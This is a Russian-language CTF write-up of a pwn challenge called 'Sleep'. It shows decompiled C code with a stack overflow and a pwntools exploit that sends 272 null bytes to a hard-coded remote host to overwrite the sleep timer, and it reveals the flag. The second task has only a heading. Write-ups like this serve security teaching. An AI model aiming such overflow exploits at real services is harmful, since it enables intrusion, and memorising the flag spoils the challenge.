# PWN. Analysis of tasks solving from forkbomb

* Sleep
* Auto Overflow 1

## Sleep
Откроем исполняемчый файл в Cutter и в функции `main` увидим следующее:
```
    undefined8 main(void)
    {
    char *buf;
    int s;
    
    alarm(5);
    s = 0x400;
    printf("Enter your name: ");
    read(0, &buf, 0x400);
    printf("Hello %s! You will get your flag in %d seconds\n", &buf, s);
    sleep(s);
    system("cat /flag");
    return 0;
    }
```
Проанализировав код, приходим к выводу, что необходимо перетереть переменную `s`, отвечающую за время, через которое нам выдадут флаг.
Также это нужно сделать менее, чем за 5 секунд, ведь, из-за команды `alarm(5)`, программа завершится. Напишем следующий эксплойт при помощи `pwntools`:
```
from pwn import *

exe = context.binary = ELF('./path-to-binary')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11576)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil(b'Enter your name: ')
load = b'\0'*272
io.send(load)
io.interactive()

```
Теперь осталось лишь запустить эксплойт: `python3 exploit-name.py` и получить **флаг: spbctf{beep_boop_overflow_int_variable}**

## Auto Overflow 1
